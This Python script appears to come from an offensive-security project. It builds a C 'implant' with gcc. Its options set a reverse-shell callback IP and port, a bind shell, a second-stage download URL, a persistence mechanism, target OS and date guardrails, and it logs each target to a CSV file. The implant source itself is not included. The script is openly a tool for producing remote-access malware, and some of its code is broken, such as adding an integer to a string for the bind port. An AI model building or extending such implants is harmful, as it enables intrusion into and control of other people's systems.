import datetime
import argparse
import binascii
import os
import subprocess
import csv
import os.path as filesys
import os


#------------------------------#
# A delicious c-based "implant"
# written by some brave CWE
# wannabes :D      ENJOY!
#------------------------------#

# Change the CWD to src in order to have access to the .c and .h files
# os.chdir('../')

# The path(s) to all of the .c and .h files to be included in the implant
implant_c_path = "testing.c"

# Available implant compiler choices
# TODO: Update this line in argparser to match the currently available options
parser = argparse.ArgumentParser(
    "python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip] [-]')

parser.add_argument("-o", "--outputName", type=str, metavar='',
                    help="output filename", default="implant")
parser.add_argument("-32", "--compile32", action="store_true",
                    help="compile for a 32bit system")
parser.add_argument("-s", "--strip", action="store_true",
                    help="turn stripping off")
parser.add_argument("-sl", "--staticLink", action="store_true",
                    help="staticly link the binary")

##### Targeting #####
parser.add_argument("-ip", "--ipAddress", type=str,
                    help="target address", metavar='', default="unknown")
parser.add_argument("-do", "--domain", type=str,
                    help="target domain", metavar='', default="unknown")

##### Guardrails #####
parser.add_argument("-a", "--architecture", type=str, metavar='',
                    help="system architecture", default="unknown")
parser.add_argument("-os", "--os", type=str, metavar='',
                    help="operating system", default="unknown")
parser.add_argument("-sd", "--startdate", type=str,
                    help="start date", metavar='', default="unknown")
parser.add_argument("-ed", "--enddate", type=str,
                    help="end date", metavar='', default="unknown")
parser.add_argument("-lv", "--libcversion", type=str, metavar='',
                    help="libc version", default="unknown")
parser.add_argument("-kv", "--kernversion", type=str, metavar='',
                    help="kernel  version", default="unknown")
parser.add_argument("-fc", "--functionality", type=str, metavar='',
                    help="functionality", default="unknown")
parser.add_argument("-eg", "--execguardrails", type=str, metavar='',
                    help="execution guardrails", default="unknown")
parser.add_argument("-pm", "--persistmech", type=str, metavar='',
                    help="persistence mechanism", default="unknown")
parser.add_argument("-sn", "--systemname", type=str, metavar='',
                    help="system name", default="unknown")

##### Attacks #####
parser.add_argument("-atkB", "--bindShell", type=int, metavar='',
                    help="run a bind shell on the given port", default=999999)
parser.add_argument("-atkR", "--reverseShell", action="store_true",
                    help="run a reverse shell")
parser.add_argument("-revip", "--reverseIP", type=str, metavar='',
                    help="reverse shell callback IP", default="unknown")
parser.add_argument("-revport", "--reversePort", type=str, metavar='',
                    help="reverse shell Port", default="unknown")
parser.add_argument("-url", "--downloadURL", type=str, metavar='', default="www.example.com",
                    help="url to get second stage downloaded (or lovely pictures of cookies)")

##### Implant Testing #####
parser.add_argument("-d", "--debug", action="store_true",
                    help="compile with debugging")
parser.add_argument("-vg", "--valgrind", action="store_true",
                    help="compile and then run the implant through valgrind")

# Parse the arguments for use in the log and elsewhere!
args = parser.parse_args()


##### Logging #####
log_exists = filesys.isfile('log.csv')
with open('log.csv', mode='a+') as log_file:
        log_writer = csv.writer(log_file, delimiter='\t',
                                quotechar='"', quoting=csv.QUOTE_MINIMAL)
        if (log_exists != 1):
                fieldnamesList = ["datetime", "ipAddress",
                                "tgtArch", "tgtOS", "outputName"]
                log_writer.writerow(fieldnamesList)

        log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(
                args.architecture), str(args.os), str(args.outputName)])


# This is the gcc command framework that will be eventually executed to compile the implant
cmdString = ["gcc", implant_c_path, "-o", args.outputName]


##### Simple Details #####
if args.ipAddress != "unknown":
    cmdString.insert(1, "-D IPNUM=\"" + (args.ipAddress) + "\"")
if args.compile32:
    cmdString.insert(1, "-m32")
if not args.strip:
    cmdString.insert(1, "-s")
if args.staticLink:
    cmdString.insert(1, "-static")

##### Attacks #####
if args.reverseIP != "unknown":
    cmdString.insert(1, "-D REVIP=\"" + (args.reverseIP) + "\"")
if args.reversePort != "unknown":
    cmdString.insert(1, "-D PORT=\"" + (args.reversePort) + "\"")
if args.bindShell != 999999:
    cmdString.insert(1, "-D PORT=\"" + (args.bindShell) + "\"")
if args.downloadURL != "www.example.com":
    cmdString.insert(1, "-D URL=\"" + (args.downloadURL) + "\"")
    cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library

##### Guardrails #####
if args.architecture != "unknown":
    cmdString.insert(1, "-D ARCH=\"" + (args.architecture) + "\"")
if args.os != "unknown":
    cmdString.insert(1, "-D OS=\"" + (args.os) + "\"")
if args.libcversion != "unknown":
    cmdString.insert(1, "-D LIBV=\"" + (args.libcversion) + "\"")
if args.kernversion != "unknown":
    cmdString.insert(1, "-D KERV=\"" + (args.kernversion) + "\"")
if args.functionality != "unknown":
    cmdString.insert(1, "-D FUNC=\"" + (args.functionality) + "\"")
if args.execguardrails != "unknown":
    cmdString.insert(1, "-D EXEC=\"" + (args.execguardrails) + "\"")
if args.persistmech != "unknown":
    cmdString.insert(1, "-D PERM=\"" + (args.persistmech) + "\"")
if args.systemname != "unknown":
    cmdString.insert(1, "-D SYSN=\"" + (args.systemname) + "\"")
if args.startdate != "unknown":
    cmdString.insert(1, "-D STRD=\"" + (args.startdate) + "\"")
if args.enddate != "unknown":
    cmdString.insert(1, "-D ENDD=\"" + (args.enddate) + "\"")

##### Implant Testing #####
if args.debug:
    cmdString.insert(1, "-D DEBUG")

print(cmdString)

# Execute the gcc string to compile the implant
subprocess.run(cmdString)

# Run the new implant
# FOR TESTING ONLY
# TODO: REMOVE THIS RUNNER SO YOU DON'T EXPLOIT YOURSELF
# subprocess.run("./" + args.outputName)

# Run the valgrind test if required
if args.valgrind:
    subprocess.run(["valgrind", "--leak-check=yes", "./"+args.outputName])
